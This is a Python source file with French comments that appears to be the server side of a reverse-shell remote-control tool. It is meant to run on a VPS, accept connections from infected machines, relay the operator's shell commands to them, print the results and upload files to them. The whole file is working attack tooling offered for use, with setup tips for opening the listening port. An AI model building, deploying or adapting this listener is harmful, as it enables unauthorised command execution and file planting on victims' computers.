import socket
import os

def send_file(conn, file_path):
    if os.path.exists(file_path):
        conn.sendall(b'upload')
        file_name = os.path.basename(file_path)
        conn.sendall(file_name.encode('utf-8') + b'\n')
        
        with open(file_path, 'rb') as f:
            while True:
                chunk = f.read(1024)
                if len(chunk) == 0:
                    break
                conn.sendall(chunk)
        conn.sendall(b'EOF')
        print(f"Fichier {file_path} envoyé.")
    else:
        conn.sendall(b'FileNotFound')
        print("Fichier introuvable.")

def get_user_and_computer_names():
    nom_user = os.getlogin() if os.name == 'posix' else os.environ.get('USERNAME') or "Admin"
    nom_pc = socket.gethostname()

    return nom_user, nom_pc

def set_text_rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m"

def prompt():
    nom_user, nom_pc = get_user_and_computer_names()
    
    
    base_color1 = set_text_rgb(104, 135, 137) + "┍━━━━ ("
    base_color2 = set_text_rgb(104, 135, 137) + ") ━ ["
    base_color3 = set_text_rgb(104, 135, 137) + "]\n┕━$ "
    tilte_color = set_text_rgb(255, 255, 255) + "~"
    user_color = set_text_rgb(58, 113, 196) + f"{nom_user}@{nom_pc}"
    print(base_color1 + user_color + base_color2 + tilte_color + base_color3 + "\033[0m", end="")
    return input(" ")

def start_server():
    HOST = 'IP DE VOTRE VPS'
    PORT = 13037 #Port vous pouvez le changer mais n'oubliez de l'ouvrir sur votre VPS en TCP

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()

        print(f'Le serveur écoute sur {HOST}:{PORT}')

        while True:
            conn, addr = s.accept()
            with conn:
                print(f'Connecté par {addr}')

                while True:
                    command = prompt().strip()

                    if not command:
                        continue

                    if command.startswith("upload"):
                        _, file_path = command.split(maxsplit=1)
                        send_file(conn, file_path)
                        continue

                    conn.sendall(command.encode("utf-8"))

                    output = conn.recv(4096).decode("utf-8")
                    if output:
                        print(f'Sortie de la commande :\n{output}')
                    else:
                        print('Aucune sortie ou client déconnecté.')

if __name__ == "__main__":
    start_server()
